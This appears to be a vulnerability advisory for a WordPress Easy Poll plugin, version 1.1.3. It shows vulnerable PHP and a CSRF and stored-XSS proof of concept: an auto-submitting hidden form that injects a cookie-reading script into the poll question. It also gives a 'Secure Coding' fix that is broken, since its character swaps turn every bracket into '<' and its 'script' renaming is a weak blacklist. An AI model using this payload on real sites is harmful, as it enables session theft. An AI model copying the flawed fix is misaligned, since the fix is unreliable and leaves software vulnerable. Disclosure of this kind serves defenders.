Exploit Author : Ahn Sung Jun
Date : 2015-12-09
Version : 1.1.3
Tested On : kail linux Iceweasel
 
===========================================
Vulnerable Code : wp_easy_poll.php
if(isset($_REQUEST[&#039;action&#039;]) and $_REQUEST[&#039;action&#039;] == &#039;p_add&#039;){
        global $wpdb;
        $pc = new poll_class;
         
        /* Line 859 */
        $insert = array(&#039;p_ques&#039; => $_REQUEST[&#039;p_ques&#039;], &#039;p_author&#039; => $_REQUEST[&#039;p_author&#039;], &#039;p_start&#039; => $_REQUEST[&#039;p_start&#039;], &#039;p_end&#039; => $_REQUEST[&#039;p_end&#039;], &#039;p_added&#039; => date("Y-m-d H:i:s"), &#039;p_status&#039; => $_REQUEST[&#039;p_status&#039;]);
         
        $new_poll_id = $wpdb->insert_id;
         
        $p_anss = $_REQUEST[&#039;p_anss&#039;];
        if(is_array($p_anss) and $new_poll_id){
            foreach($p_anss as $key => $value){
                if($value != &#039;&#039;){
                    $insert1 = array(&#039;p_id&#039; => $new_poll_id, &#039;a_ans&#039; => $value, &#039;a_order&#039; => $key+1);
                }
            }
        }
 
===========================================
POC (XSS & CSRF)
<html>
    <body onload="javascript:document.forms[0].submit()">
    <input type="hidden" name="action" value="p_add" />
    <input type="hidden" name="p_ques" value="<script>alert(document.cookie)</script>">
    <input type="hidden" name="p_start" id="p_start" value="2015-11-18 22:55:52" required="required" />
    <input type="hidden" name="p_end" id="p_end" value="2015-11-20 09:00:00" required="required"/>
    <input type="submit" name="submit" value="Submit" class="button" />
    </form>
</html>
 
===========================================
Secure Coding
if(isset($_REQUEST[&#039;action&#039;]) and $_REQUEST[&#039;action&#039;] == &#039;p_add&#039;){
        global $wpdb;
        $pc = new poll_class;
 
        /* Secure Coding */
            $_REQUEST[&#039;p_ques&#039;] = str_replace("script", "x-script", $_REQUEST[&#039;p_ques&#039;]);
            $_REQUEST[&#039;p_ques&#039;] = str_replace("<", ">", $_REQUEST[&#039;p_ques&#039;]);
            $_REQUEST[&#039;p_ques&#039;]= str_replace(">" ,"<", $_REQUEST[&#039;p_ques&#039;]);
 
        $insert = array(&#039;p_ques&#039; => $_REQUEST[&#039;p_ques&#039;], &#039;p_author&#039; => $_REQUEST[&#039;p_author&#039;], &#039;p_start&#039; => $_REQUEST[&#039;p_start&#039;], &#039;p_end&#039; => $_REQUEST[&#039;p_end&#039;], &#039;p_added&#039; => date("Y-m-d H:i:s"), &#039;p_status&#039; => $_REQUEST[&#039;p_status&#039;]);
         
        $new_poll_id = $wpdb->insert_id;
         
        $p_anss = $_REQUEST[&#039;p_anss&#039;];
        if(is_array($p_anss) and $new_poll_id){
            foreach($p_anss as $key => $value){
                if($value != &#039;&#039;){
                    $insert1 = array(&#039;p_id&#039; => $new_poll_id, &#039;a_ans&#039; => $value, &#039;a_order&#039; => $key+1);
                }
            }
        }

